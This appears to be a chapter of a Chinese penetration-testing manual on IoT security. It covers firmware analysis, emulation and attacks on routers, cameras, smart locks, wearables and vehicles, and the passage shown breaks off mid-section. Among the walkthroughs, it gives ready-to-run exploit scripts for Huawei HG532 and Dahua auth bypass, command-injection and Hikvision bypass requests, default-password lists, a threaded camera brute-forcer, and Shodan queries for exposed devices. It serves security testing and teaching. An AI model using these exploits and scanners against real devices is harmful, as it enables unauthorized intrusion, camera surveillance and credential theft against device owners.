# 第29章 IoT物联网安全环境

## 29.1 物联网安全概述

### 29.1.1 IoT安全威胁模型

物联网（Internet of Things，IoT）是指通过互联网将各种物理设备连接起来，实现信息交换和通信的网络。IoT设备广泛应用于智能家居、工业控制、医疗健康、智慧城市等领域，但其安全问题日益突出。

**IoT安全威胁模型主要包括：**

- **设备层威胁**：弱口令、硬编码密钥、固件漏洞、物理接口暴露
- **网络层威胁**：未加密通信、协议漏洞、中间人攻击、拒绝服务
- **应用层威胁**：API漏洞、身份认证缺陷、数据泄露、远程代码执行
- **数据层威胁**：数据采集不安全、存储加密不足、传输未加密、隐私泄露
- **管理层威胁**：设备管理漏洞、OTA更新不安全、访问控制不足

### 29.1.2 常见IoT漏洞类型

| 漏洞类型 | 说明 | 典型案例 |
|---------|------|---------|
| 弱口令/默认口令 | 设备使用默认或简单密码 | 大量摄像头、路由器默认口令 |
| 固件漏洞 | 固件中存在的代码漏洞 | 缓冲区溢出、命令注入 |
| 不安全的网络服务 | 开放不必要的端口和服务 | Telnet、SSH弱口令 |
| 不安全的云接口 | 云平台API存在漏洞 | 未授权访问、越权操作 |
| 不安全的移动应用 | 配套APP存在安全漏洞 | 数据明文存储、证书验证失效 |
| 缺乏安全更新机制 | 设备无法或难以更新 | 永久Day漏洞 |
| 物理安全缺陷 | 物理接口可被利用 | UART、JTAG接口暴露 |

### 29.1.3 测试方法学

**IoT渗透测试流程：**

```
信息收集 → 固件分析 → 硬件分析 → 网络分析 → 应用分析 → 漏洞利用 → 报告撰写
```

**关键测试点：**
- 设备发现与端口扫描
- 固件获取与解包分析
- 硬件接口调试（UART/JTAG）
- 网络协议分析
- 移动APP测试
- 云API测试
- 身份认证与权限测试
- 数据传输与存储安全

### 29.1.4 攻击面分析

**IoT设备攻击面：**

```
┌─────────────────────────────────────────────────────┐
│                    云平台/移动APP                     │
│  API接口、身份认证、数据存储、OTA更新                  │
└──────────────────────┬──────────────────────────────┘
                       │ 互联网/移动网络
┌──────────────────────▼──────────────────────────────┐
│                    网络传输层                         │
│  WiFi、蓝牙、Zigbee、Z-Wave、LoRa、NB-IoT            │
└──────────────────────┬──────────────────────────────┘
                       │
┌──────────────────────▼──────────────────────────────┐
│                    设备固件层                         │
│  操作系统、应用程序、配置文件、加密密钥                 │
└──────────────────────┬──────────────────────────────┘
                       │
┌──────────────────────▼──────────────────────────────┐
│                    硬件物理层                         │
│  UART、JTAG、SWD、Flash芯片、调试接口                  │
└─────────────────────────────────────────────────────┘
```

---

## 29.2 路由器漏洞环境

### 29.2.1 路由器固件下载

#### 【通用】固件获取途径

**操作位置：浏览器**

**官方网站下载：**

```bash
# D-Link官方支持
https://support.dlink.com/

# TP-Link官方支持
https://www.tp-link.com/cn/support/

# 华为官方支持
https://support.huawei.com/enterprise/zh/category/routers-pid-10097

# Netgear官方支持
https://www.netgear.com/support/
```

**第三方固件数据库：**

```bash
# 设备固件数据库
https://firmware.center/

# OpenWrt固件
https://downloads.openwrt.org/

# DD-WRT固件
https://dd-wrt.com/

# 漏洞固件库（需自行收集）
https://github.com/adi0x90/routersploit
```

### 29.2.2 固件解包工具

#### 【Linux环境】binwalk安装与使用

**操作位置：Kali Linux 终端**

**安装步骤：**

```bash
# 方法1：apt安装（Kali默认已安装）
sudo apt update
sudo apt install binwalk -y

# 方法2：源码安装最新版
git clone https://github.com/ReFirmLabs/binwalk.git
cd binwalk
sudo python3 setup.py install
sudo ./deps.sh  # 安装依赖工具
```

**预期输出：**
```
Cloning into 'binwalk'...
remote: Enumerating objects: 10000, done.
remote: Counting objects: 100% (10000/10000), done.
remote: Compressing objects: 100% (5000/5000), done.
Receiving objects: 100% (10000/10000), 10.00 MiB | 5.00 MiB/s, done.
Resolving deltas: 100% (7000/7000), done.
```

**使用示例：**

```bash
# 基本固件分析
binwalk firmware.bin

# 提取固件内容
binwalk -e firmware.bin

# 递归提取
binwalk -eM firmware.bin

# 显示详细信息
binwalk -v firmware.bin

# 搜索特定签名
binwalk -R "password" firmware.bin
```

**预期输出（分析示例）：**
```
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             TRX firmware header, little endian, image size: 8388608 bytes, 
                              CRC32: 0xFFFFFFFF, flags: 0x0, version: 1, offset: 28
28            0x1C            uImage header, header size: 64 bytes, 
                              name: "MIPS Linux-2.6.36",
                              created: 2015-01-01 00:00:00,
                              image size: 1310720 bytes,
                              data address: 0x80000000,
                              entry point: 0x80000000,
                              data CRC: 0xFFFFFFFF,
                              os: Linux,
                              arch: MIPS,
                              image type: Standalone Program,
                              compression type: gzip,
                              image name: "MIPS Linux-2.6.36"
```

#### 【Linux环境】firmware-mod-kit安装与使用

**操作位置：Kali Linux 终端**

**安装步骤：**

```bash
# 安装依赖
sudo apt install build-essential zlib1g-dev liblzma-dev python3-magic -y

# 下载源码
git clone https://github.com/rampageX/firmware-mod-kit.git
cd firmware-mod-kit

# 编译工具
cd src
./configure
make
sudo make install
cd ..
```

**使用示例：**

```bash
# 提取固件
./extract-firmware.sh firmware.bin

# 重新打包固件
./build-firmware.sh extracted_firmware/
```

**预期输出：**
```
Firmware Mod Kit (extract) 0.99, (c)2011-2013 Craig Heffner, Jeremy Collake
...
Extracting 4980736 bytes of  header image at offset 0
Extracting 4980736 bytes of  header image at offset 0
Extracting squashfs file system...
```

#### 【Linux环境】unsquashfs安装与使用

**操作位置：Kali Linux 终端**

**安装步骤：**

```bash
sudo apt install squashfs-tools -y
```

**使用示例：**

```bash
# 查看squashfs信息
unsquashfs -s filesystem.squashfs

# 解压squashfs文件系统
unsquashfs -d extracted_fs filesystem.squashfs

# 解压时显示详细信息
unsquashfs -li filesystem.squashfs
```

**预期输出：**
```
Found a valid SQUASHFS 4.0 superblock on filesystem.squashfs
Creation or last append time Thu Jan  1 00:00:00 2015
Filesystem size 1234567 bytes (1205.63 Kbytes / 1.18 Mbytes)
Compression gzip
Block size 131072
Filesystem is exportable via NFS
Inodes are compressed
Data is compressed
Fragments are compressed
Always_use_fragments option is not specified
Check data is not present
Number of fragments 45
Number of inodes 1234
Number of ids 5
```

#### 【Linux环境】jefferson安装与使用（JFFS2文件系统）

**操作位置：Kali Linux 终端**

**安装步骤：**

```bash
# 安装依赖
sudo apt install python3-pip liblzo2-dev -y

# 安装jefferson
pip3 install jefferson
```

**使用示例：**

```bash
# 解压JFFS2镜像
jefferson jffs2.img

# 指定输出目录
jefferson -d extracted_jffs2 jffs2.img
```

**预期输出：**
```
[+] Scanning for JFFS2 nodes...
[+] Found 1234 JFFS2 nodes
[+] Extracting files...
[+] Extraction complete. 567 files extracted.
```

### 29.2.3 固件仿真

#### 【Linux环境】QEMU用户模式

**操作位置：Kali Linux 终端**

**安装步骤：**

```bash
# 安装QEMU用户模式
sudo apt install qemu-user-static qemu-user -y

# 安装所有架构支持
sudo apt install qemu-user-binfmt -y
```

**使用示例：**

```bash
# 查看支持的架构
qemu-mips --version
qemu-arm --version

# 运行MIPS架构二进制
qemu-mips-static -L extracted_fs/ extracted_fs/bin/busybox

# 运行ARM架构二进制
qemu-arm-static -L extracted_fs/ extracted_fs/bin/busybox

# 运行指定程序并传入参数
qemu-mips-static -L extracted_fs/ extracted_fs/usr/sbin/httpd --help
```

**预期输出：**
```
BusyBox v1.22.1 (2015-01-01 00:00:00 UTC) multi-call binary.

Usage: busybox [function [arguments]...]
   or: busybox --list [-full]
   or: function [arguments]...
```

#### 【Linux环境】QEMU系统模式

**操作位置：Kali Linux 终端**

**安装步骤：**

```bash
# 安装QEMU系统模式
sudo apt install qemu-system-mips qemu-system-arm -y
```

**使用示例（MIPS Malta板仿真）：**

```bash
# 下载MIPS Linux内核镜像
wget https://people.debian.org/~aurel32/qemu/mips/vmlinux-3.2.0-4-4kc-malta
wget https://people.debian.org/~aurel32/qemu/mips/debian_wheezy_mips_standard.qcow2

# 启动MIPS系统
qemu-system-mips \
  -M malta \
  -kernel vmlinux-3.2.0-4-4kc-malta \
  -hda debian_wheezy_mips_standard.qcow2 \
  -append "root=/dev/sda1 console=tty0" \
  -m 256 \
  -nographic \
  -netdev user,id=mynet0,hostfwd=tcp::2222-:22 \
  -device e1000,netdev=mynet0

# SSH连接
ssh -p 2222 root@localhost
```

**预期输出：**
```
[    0.000000] Linux version 3.2.0-4-4kc-malta (debian-kernel@lists.debian.org) ...
[    0.000000] bootconsole [early0] enabled
...
Debian GNU/Linux 7 debian-mips ttyS0

debian-mips login:
```

#### 【Linux环境】FirmAE固件分析框架

**操作位置：Kali Linux 终端**

**安装步骤：**

```bash
# 安装依赖
sudo apt install busybox-static fakeroot git dmsetup kpartx netcat-openbsd nmap python3-psycopg2 snmp uml-utilities util-linux vlan qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils -y

# 克隆仓库
git clone --recursive https://github.com/pr0v3rbs/FirmAE.git
cd FirmAE

# 初始化配置
./init.sh

# 设置数据库密码
sudo su postgres
psql -c "ALTER USER firmware WITH PASSWORD 'firmware';"
exit

# 修改配置文件
sed -i 's/firmae_password/firmware/g' firmae.config
```

**使用示例：**

```bash
# 下载示例固件
./download.sh

# 初始化固件数据库
./init_db.py

# 分析单个固件
./run.sh -c 1 ./firmware/DIR-890L_FW102b01.bin

# 批量分析固件
./run.sh -a ./firmware/

# 查看仿真状态
./run.sh -q ./firmware/DIR-890L_FW102b01.bin

# 获取固件shell
./run.sh -s ./firmware/DIR-890L_FW102b01.bin

# 运行Nmap扫描
./run.sh -n ./firmware/DIR-890L_FW102b01.bin
```

**预期输出：**
```
[*] FirmAE Analysis - ./firmware/DIR-890L_FW102b01.bin
[*] Brand: dlink
[*] Architecture: mips
[*] Endian: little
[*] Image extraction: success
[*] Kernel extraction: success
[*] File system identification: squashfs
[*] Emulation: success
[*] Network: 192.168.0.1
```

### 29.2.4 路由器漏洞复现

#### 【Linux环境】D-Link漏洞复现

**操作位置：Kali Linux 终端**

**D-Link DIR-890L 命令注入漏洞（CVE-2020-9376）：**

```bash
# 下载漏洞固件
wget https://support.dlink.com/resource/PRODUCTS/DIR-890L/REVA/DIR-890L_REVA_FIRMWARE_v1.02b01.zip

# 使用FirmAE仿真固件
./run.sh -c 1 DIR-890L_FW102b01.bin

# 获取网络地址
./run.sh -q DIR-890L_FW102b01.bin

# 验证漏洞（命令注入）
curl -d "act=ping&dst=;id;" http://192.168.0.1/hedwig.cgi
```

**预期输出：**
```
uid=0(root) gid=0(root)
```

#### 【Linux环境】TP-Link漏洞复现

**操作位置：Kali Linux 终端**

**TP-Link Archer C50 命令注入漏洞：**

```bash
# 使用Routersploit利用漏洞
msfconsole -q
use exploit/linux/misc/tplink_archer_a7_c7_lan_rce
set RHOSTS 192.168.0.1
set RPORT 80
set USERNAME admin
set PASSWORD admin
exploit
```

**预期输出：**
```
[*] Started reverse TCP handler on 192.168.1.100:4444
[*] Authenticating...
[+] Login successful
[*] Sending exploit...
[*] Command shell session 1 opened
```

#### 【Linux环境】华为路由器漏洞复现

**操作位置：Kali Linux 终端**

**华为HG532 命令注入漏洞（CVE-2017-17215）：**

```bash
# 漏洞验证脚本
cat > hg532_exploit.py << 'EOF'
import requests
import sys

def exploit(target, cmd):
    url = f"http://{target}:37215/ctrlt/DeviceUpgrade_1"
    headers = {
        "Content-Type": "text/xml",
        "SOAPAction": '"urn:dslforum-org:service:DeviceUpgrade:1#Upgrade"'
    }
    body = f'''<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<s:Body><u:Upgrade xmlns:u="urn:dslforum-org:service:DeviceUpgrade:1">
<NewStatusURL>;{cmd};</NewStatusURL>
<NewDownloadURL></NewDownloadURL>
</u:Upgrade></s:Body></s:Envelope>'''
    response = requests.post(url, headers=headers, data=body, timeout=10)
    print(response.text)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <target> <command>")
        sys.exit(1)
    exploit(sys.argv[1], sys.argv[2])
EOF

# 运行漏洞验证
python3 hg532_exploit.py 192.168.1.1 "id"
```

**预期输出：**
```
uid=0(root) gid=0(root)
```

#### 【Linux环境】Netgear漏洞复现

**操作位置：Kali Linux 终端**

**Netgear R7000 认证绕过漏洞（CVE-2017-5521）：**

```bash
# 漏洞验证
curl -v "http://192.168.1.1/passwordrecovered.cgi?id=test"

# 使用Routersploit
cd routersploit
python3 rsf.py
use exploits/routers/netgear/r7000_password_disclosure
set target 192.168.1.1
run
```

**预期输出：**
```
[*] Running module...
[+] Credentials found:
    Username: admin
    Password: password123
```

---

## 29.3 摄像头安全环境

### 29.3.1 常见摄像头漏洞类型

- **弱口令/默认口令**：大量摄像头使用默认账号密码
- **未授权访问**：管理接口无需认证即可访问
- **RTSP协议漏洞**：RTSP流无需认证即可查看
- **ONVIF协议漏洞**：ONVIF接口存在安全缺陷
- **固件漏洞**：命令注入、缓冲区溢出等
- **UPnP漏洞**：UPnP服务暴露敏感信息
- **云平台漏洞**：云平台API存在越权访问

### 29.3.2 海康威视/大华漏洞环境

#### 【通用】海康威视漏洞环境搭建

**操作位置：Kali Linux 终端 / 浏览器**

**海康威视弱口令检测：**

```bash
# 使用nmap扫描海康威视设备
nmap -p 80,554,8000 192.168.1.0/24

# 海康威视默认口令
# admin/12345
# admin/admin
# admin/888888
# admin/123456abc
```

**海康威视CVE-2017-7921漏洞验证：**

```bash
# 漏洞POC - 列出所有摄像头
curl "http://192.168.1.64/Security/users?auth=YWRtaW46MTEK"

# 获取快照
curl "http://192.168.1.64/onvif-http/snapshot?auth=YWRtaW46MTEK"

# 获取配置文件
curl "http://192.168.1.64/System/configurationFile?auth=YWRtaW46MTEK"
```

**预期输出：**
```
<?xml version="1.0" encoding="UTF-8"?>
<UserList version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema">
  <User>
    <id>1</id>
    <userName>admin</userName>
    <password>12345</password>
  </User>
</UserList>
```

#### 【通用】大华摄像头漏洞环境

**操作位置：Kali Linux 终端**

**大华摄像头弱口令：**

```bash
# 默认账号密码
# admin/admin
# admin/888888
# admin/123456
# admin/admin123
```

**大华CVE-2021-33044 身份绕过漏洞：**

```bash
# 漏洞验证脚本
cat > dahua_bypass.py << 'EOF'
import requests
import sys

def exploit(target):
    url = f"http://{target}/RPC2_Login"
    data = {
        "method": "global.login",
        "params": {
            "userName": "admin",
            "password": "",
            "clientType": "NetKeyboard",
            "loginType": "Direct",
            "authorityType": "Default",
            "passwordType": "Default",
            "ip": "127.0.0.1"
        },
        "id": 1
    }
    response = requests.post(url, json=data, timeout=10)
    print(response.json())

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target>")
        sys.exit(1)
    exploit(sys.argv[1])
EOF

python3 dahua_bypass.py 192.168.1.65
```

### 29.3.3 ONVIF协议分析

#### 【Linux环境】ONVIF工具安装

**操作位置：Kali Linux 终端**

**安装onvif工具：**

```bash
# 安装gSOAP工具
sudo apt install gsoap -y

# Python ONVIF库
pip3 install onvif
pip3 install zeep

# ONVIF客户端工具
git clone https://github.com/quatanium/python-onvif.git
cd python-onvif
python3 setup.py install
```

**ONVIF设备发现：**

```bash
# 使用ws-discovery发现设备
cat > onvif_discover.py << 'EOF'
import sys
from wsdiscovery.discovery import ThreadedWSDiscovery as WSDiscovery

def discover():
    wsd = WSDiscovery()
    wsd.start()
    services = wsd.searchServices()
    wsd.stop()
    
    for service in services:
        print(f"XAddr: {service.getXAddrs()}")
        print(f"Types: {service.getTypes()}")
        print(f"Scopes: {service.getScopes()}")
        print("-" * 50)

if __name__ == "__main__":
    discover()
EOF

python3 onvif_discover.py
```

**预期输出：**
```
XAddr: ['http://192.168.1.64/onvif/device_service']
Types: ['{http://www.onvif.org/ver10/device/wsdl}Device']
Scopes: ['onvif://www.onvif.org/type/network_video_transmitter', 
         'onvif://www.onvif.org/location/city/beijing',
         'onvif://www.onvif.org/name/IPCamera']
```

**获取摄像头信息：**

```bash
cat > onvif_info.py << 'EOF'
from onvif import ONVIFCamera

def get_info(ip, port, user, password):
    cam = ONVIFCamera(ip, port, user, password)
    
    # 获取设备信息
    dev_info = cam.devicemgmt.GetDeviceInformation()
    print(f"厂商: {dev_info.Manufacturer}")
    print(f"型号: {dev_info.Model}")
    print(f"固件版本: {dev_info.FirmwareVersion}")
    print(f"序列号: {dev_info.SerialNumber}")
    
    # 获取用户列表
    users = cam.devicemgmt.GetUsers()
    for user in users:
        print(f"用户: {user.Username}, 等级: {user.UserLevel}")

if __name__ == "__main__":
    get_info('192.168.1.64', 80, 'admin', '12345')
EOF

python3 onvif_info.py
```

### 29.3.4 RTSP协议测试

#### 【Linux环境】RTSP工具安装与使用

**操作位置：Kali Linux 终端**

**安装RTSP工具：**

```bash
# 安装VLC（用于播放RTSP流）
sudo apt install vlc -y

# 安装ffmpeg
sudo apt install ffmpeg -y

# 安装live555工具
sudo apt install livemedia-utils -y
```

**RTSP弱口令检测：**

```bash
# 常见RTSP默认地址
# rtsp://192.168.1.64:554/
# rtsp://192.168.1.64:554/stream1
# rtsp://192.168.1.64:554/live.sdp
# rtsp://192.168.1.64:554/h264/ch1/main/av_stream

# 使用ffprobe测试RTSP流
ffprobe rtsp://admin:12345@192.168.1.64:554/h264/ch1/main/av_stream

# 使用openRTSP测试
openRTSP rtsp://192.168.1.64:554/stream1
```

**预期输出：**
```
Input #0, rtsp, from 'rtsp://admin:12345@192.168.1.64:554/h264/ch1/main/av_stream':
  Metadata:
    title           : Media Presentation
  Duration: N/A, start: 0.000000, bitrate: N/A
  Stream #0:0: Video: h264 (Main), yuv420p, 1920x1080, 25 fps, 25 tbr, 90k tbn, 180k tbc
  Stream #0:1: Audio: aac (LC), 16000 Hz, mono, fltp
```

**RTSP认证暴力破解：**

```bash
# 使用hydra爆破RTSP
hydra -L usernames.txt -P passwords.txt 192.168.1.64 rtsp

# 使用nmap脚本
nmap -p 554 --script rtsp-methods 192.168.1.64
nmap -p 554 --script rtsp-request 192.168.1.64
```

### 29.3.5 弱口令检测环境

#### 【Linux环境】摄像头弱口令扫描

**操作位置：Kali Linux 终端**

**使用Nmap扫描：**

```bash
# 扫描常见摄像头端口
nmap -p 80,81,554,8000,8080,37777,34567 192.168.1.0/24 -oN camera_scan.txt

# 使用http-title脚本识别设备
nmap -p 80,8080 --script http-title 192.168.1.0/24
```

**摄像头弱口令检测脚本：**

```bash
cat > camera_brute.py << 'EOF'
import requests
import sys
from multiprocessing.dummy import Pool as ThreadPool

# 常见摄像头厂商和默认口令
camera_defaults = [
    # 海康威视
    {"brand": "Hikvision", "port": 80, "path": "/ISAPI/Security/userCheck", 
     "users": ["admin"], "passwords": ["12345", "admin", "888888"]},
    # 大华
    {"brand": "Dahua", "port": 80, "path": "/RPC2_Login",
     "users": ["admin"], "passwords": ["admin", "888888", "123456"]},
    # 宇视
    {"brand": "Uniview", "port": 80, "path": "/",
     "users": ["admin"], "passwords": ["123456", "admin"]},
]

def check_login(ip, port, user, password, brand):
    try:
        url = f"http://{ip}:{port}/"
        response = requests.get(url, auth=(user, password), timeout=3)
        if response.status_code == 200:
            print(f"[+] {ip}:{port} {brand} - {user}:{password}")
            return True
    except:
        pass
    return False

def scan_camera(ip):
    for camera in camera_defaults:
        for user in camera["users"]:
            for pwd in camera["passwords"]:
                if check_login(ip, camera["port"], user, pwd, camera["brand"]):
                    return

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <ip_range>")
        print(f"Example: {sys.argv[0]} 192.168.1.0/24")
        sys.exit(1)
    
    ip_base = sys.argv[1].split('.')[0:3]
    ips = [f"{'.'.join(ip_base)}.{i}" for i in range(1, 255)]
    
    pool = ThreadPool(50)
    pool.map(scan_camera, ips)
    pool.close()
    pool.join()
EOF

python3 camera_brute.py 192.168.1.0/24
```

---

## 29.4 智能设备安全

### 29.4.1 智能门锁安全测试环境

#### 【Linux环境】蓝牙智能门锁测试

**操作位置：Kali Linux 终端 + 蓝牙适配器**

**安装蓝牙工具：**

```bash
# 安装蓝牙工具集
sudo apt install bluez bluez-tools bluetooth -y

# 安装gatttool
sudo apt install bluez-hcidump -y

# Python蓝牙库
pip3 install bluepy
pip3 install pygatt
```

**蓝牙设备扫描：**

```bash
# 扫描经典蓝牙设备
hcitool scan

# 扫描BLE设备
hcitool lescan

# 使用gatttool连接
gatttool -b AA:BB:CC:DD:EE:FF -I

# 读取所有特征值
# [AA:BB:CC:DD:EE:FF][LE]> primary
# [AA:BB:CC:DD:EE:FF][LE]> characteristics
```

**预期输出：**
```
Scanning ...
        AA:BB:CC:DD:EE:FF       SmartLock
        11:22:33:44:55:66       MiBand
```

**智能门锁测试脚本：**

```bash
cat > ble_lock_test.py << 'EOF'
from bluepy.btle import Scanner, DefaultDelegate, Peripheral
import sys

class ScanDelegate(DefaultDelegate):
    def __init__(self):
        DefaultDelegate.__init__(self)

    def handleDiscovery(self, dev, isNewDev, isNewData):
        if isNewDev:
            print(f"发现设备: {dev.addr} ({dev.addrType})")
            for (adtype, desc, value) in dev.getScanData():
                print(f"  {desc}: {value}")

def scan_devices():
    scanner = Scanner().withDelegate(ScanDelegate())
    devices = scanner.scan(10.0)
    return devices

def connect_device(addr):
    try:
        p = Peripheral(addr)
        print(f"连接成功: {addr}")
        
        services = p.getServices()
        for svc in services:
            print(f"服务: {svc.uuid}")
            characteristics = svc.getCharacteristics()
            for char in characteristics:
                print(f"  特征: {char.uuid} - {char.propertiesToString()}")
                if char.supportsRead():
                    try:
                        val = char.read()
                        print(f"    值: {val.hex()}")
                    except:
                        pass
        
        p.disconnect()
    except Exception as e:
        print(f"连接失败: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} scan")
        print(f"       {sys.argv[0]} connect <addr>")
        sys.exit(1)
    
    if sys.argv[1] == "scan":
        scan_devices()
    elif sys.argv[1] == "connect" and len(sys.argv) == 3:
        connect_device(sys.argv[2])
EOF

sudo python3 ble_lock_test.py scan
```

### 29.4.2 智能音箱安全

#### 【Linux环境】智能音箱测试环境

**操作位置：Kali Linux 终端**

**智能音箱常见攻击面：**

```
┌─────────────────────────────────────────────────────┐
│                  智能音箱攻击面                        │
├─────────────────────────────────────────────────────┤
│  1. WiFi连接安全 - 配网过程中的凭证窃取                │
│  2. 语音攻击 - 语音指令伪造、海豚音攻击                │
│  3. 蓝牙安全 - 蓝牙配对劫持、数据窃取                  │
│  4. 移动APP - APP漏洞、凭证存储不安全                  │
│  5. 云服务 - API漏洞、隐私数据泄露                    │
│  6. 固件安全 - 固件漏洞、更新劫持                     │
└─────────────────────────────────────────────────────┘
```

**智能音箱WiFi配网分析：**

```bash
# 使用aircrack-ng监听WiFi配网
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon

# 抓取配网过程中的数据包
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
```

**语音攻击测试工具：**

```bash
# 安装音频处理工具
sudo apt install sox ffmpeg -y

# 生成海豚音（超声波）指令
sox -n attack.wav synth 1 sine 25000 gain -1

# 生成隐藏在白噪声中的指令
sox -n -r 44100 -c 2 hidden_cmd.wav synth 2 whitenoise vol 0.5
sox hidden_cmd.wav command.wav mixed.wav mix
```

### 29.4.3 智能家居设备（米家、HomeKit）

#### 【Linux环境】米家设备安全测试

**操作位置：Kali Linux 终端**

**米家协议分析工具：**

```bash
# 安装米家协议分析工具
git clone https://github.com/miio-h5/miio.git
cd miio
pip3 install python-miio

# 发现米家设备
miiocli device --ip 192.168.1.100 --token abcdef1234567890abcdef1234567890 info
```

**预期输出：**
```
Model: chuangmi.plug.m1
Hardware version: MW300
Firmware version: 1.2.4_16
WiFi firmware version: SD878x-14.76.36.p154
```

**抓取米家设备流量：**

```bash
# 使用tcpdump抓取流量
sudo tcpdump -i eth0 host 192.168.1.100 -w miio.pcap

# 解密米家协议
git clone https://github.com/607011/miio.git
cd miio
python3 miio_decrypt.py miio.pcap
```

#### 【通用】HomeKit设备安全测试

**操作位置：macOS / Linux**

**HomeKit安全特性：**
- 端到端加密
- 设备配对认证
- 安全的固件更新
- 隐私保护设计

**HomeKit安全测试工具：**

```bash
# HomeKit工具（Node.js）
npm install -g hap-nodejs

# 发现HomeKit设备
dns-sd -B _hap._tcp
```

### 29.4.4 可穿戴设备安全

#### 【Linux环境】智能手环安全测试

**操作位置：Kali Linux 终端 + 蓝牙适配器**

**智能手环常见漏洞：**
- 蓝牙配对无认证
- 数据传输未加密
- 固件更新不安全
- 敏感数据明文存储

**手环数据窃取测试：**

```bash
# 扫描BLE设备
sudo hcitool lescan

# 使用gatttool读取数据
gatttool -b AA:BB:CC:DD:EE:FF -I
# connect
# primary
# characteristics
# char-read-uuid <uuid>
```

**心率数据读取示例：**

```bash
cat > hr_reader.py << 'EOF'
from bluepy.btle import Peripheral, UUID
import sys

def read_heart_rate(addr):
    p = Peripheral(addr)
    
    # 心率服务UUID: 0000180d-0000-1000-8000-00805f9b34fb
    hr_service = p.getServiceByUUID(UUID(0x180d))
    
    # 心率测量特征: 00002a37-0000-1000-8000-00805f9b34fb
    hr_char = hr_service.getCharacteristics(UUID(0x2a37))[0]
    
    hr_data = hr_char.read()
    heart_rate = hr_data[1]
    print(f"心率: {heart_rate} BPM")
    
    p.disconnect()
    return heart_rate

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <mac_address>")
        sys.exit(1)
    read_heart_rate(sys.argv[1])
EOF

sudo python3 hr_reader.py AA:BB:CC:DD:EE:FF
```

### 29.4.5 车联网安全基础

#### 【Linux环境】车载网络安全测试环境

**操作位置：Kali Linux 终端**

**车联网安全层次：**

```
┌─────────────────────────────────────────────────────┐
│                  车联网安全层次                        │
├─────────────────────────────────────────────────────┤
│  应用层：车机系统、移动APP、云平台                      │
│  系统层：车载操作系统、固件安全                         │
│  网络层：CAN/LIN总线、车载以太网、蓝牙、WiFi            │
│  感知层：传感器、摄像头、雷达                           │
│  物理层：OBD接口、调试接口、ECU芯片                     │
└─────────────────────────────────────────────────────┘
```

**CAN总线分析工具安装：**

```bash
# 安装CAN工具
sudo apt install can-utils -y

# Python CAN库
pip3 install python-can
```

**虚拟CAN环境搭建：**

```bash
# 加载内核模块
sudo modprobe vcan

# 创建虚拟CAN接口
sudo ip link add dev vcan0 type vcan
sudo ip link set up vcan0

# 查看接口
ip link show vcan0
```

**预期输出：**
```
3: vcan0: <NOARP,UP,LOWER_UP> mtu 72 qdisc fq_codel state UP mode DEFAULT group default qlen 1000
    link/can
```

**CAN总线数据发送与接收：**

```bash
# 发送CAN消息
cansend vcan0 123#1122334455667788

# 监听CAN消息
candump vcan0

# 生成CAN流量
canplayer -I can_logfile.log vcan0=can0

# 记录CAN流量
candump -l vcan0
```

**预期输出（candump）：**
```
vcan0  123   [8]  11 22 33 44 55 66 77 88
vcan0  123   [8]  11 22 33 44 55 66 77 88
```

**OBD-II诊断测试：**

```bash
# 安装OBD工具
pip3 install obd

# OBD测试脚本
cat > obd_test.py << 'EOF'
import obd

# 连接OBD适配器（USB或蓝牙）
connection = obd.OBD()  # 自动检测

# 读取车速
speed = connection.query(obd.commands.SPEED)
print(f"车速: {speed}")

# 读取转速
rpm = connection.query(obd.commands.RPM)
print(f"转速: {rpm}")

# 读取冷却液温度
temp = connection.query(obd.commands.COOLANT_TEMP)
print(f"冷却液温度: {temp}")
EOF

python3 obd_test.py
```

---

## 29.5 IoT渗透测试工具

### 29.5.1 Shodan / Censys / ZoomEye

#### 【通用】Shodan物联网搜索引擎

**操作位置：浏览器 / Kali Linux 终端**

**Shodan网页使用：**

```bash
# Shodan官网
https://www.shodan.io/

# 常用搜索语法
# 搜索摄像头
category:webcam
product:webcam

# 搜索路由器
product:"router"

# 搜索特定端口
port:554

# 搜索特定厂商
org:"D-Link"

# 搜索特定国家/地区
country:CN
city:"Beijing"

# 组合搜索
product:"Hikvision" country:CN
```

**Shodan CLI安装：**

```bash
# 安装Shodan CLI
pip3 install shodan

# 初始化API Key
shodan init YOUR_API_KEY
```

**Shodan CLI使用：**

```bash
# 搜索设备
shodan search "Hikvision" --limit 20

# 查看主机信息
shodan host 192.168.1.1

# 搜索摄像头
shodan search "port:554" --limit 10

# 搜索路由器
shodan search "product:mikrotik" --limit 10

# 下载搜索结果
shodan download results "Hikvision"
```

**预期输出：**
```
192.168.1.64   Hikvision Digital Technology Co.,Ltd. Webcam
192.168.1.65   Dahua Technology Webcam
...
```

#### 【通用】Censys搜索引擎

**操作位置：浏览器 / 终端**

```bash
# Censys官网
https://censys.io/

# 安装CLI
pip3 install censys

# 配置API
censys config

# 搜索示例
censys search 'services.service_name: HTTP and services.http.response.headers: "Hikvision"'
```

#### 【通用】ZoomEye（钟馗之眼）

**操作位置：浏览器 / 终端**

```bash
# ZoomEye官网
https://www.zoomeye.org/

# 常用搜索
# 搜索摄像头
app:"Hikvision"
app:"Dahua"

# 搜索工控设备
app:"Modbus"
app:"Siemens S7"

# Python SDK
pip3 install zoomeye
```

### 29.5.2 Nmap IoT扫描脚本

#### 【Linux环境】Nmap IoT扫描

**操作位置：Kali Linux 终端**

**常用IoT相关NSE脚本：**

```bash
# 列出所有IoT相关脚本
ls /usr/share/nmap/scripts/ | grep -E "http-|rtsp-|upnp-|onvif|bacnet|modbus|s7|enip"

# 搜索IoT设备
nmap -sV --script=http-title -p 80,8080,8000 192.168.1.0/24

# RTSP扫描
nmap -p 554 --script=rtsp-methods,rtsp-request 192.168.1.0/24

# UPnP扫描
nmap -p 1900 --script=upnp-info 192.168.1.0/24

# ONVIF发现
nmap -p 80 --script=onvif 192.168.1.0/24

# Modbus扫描
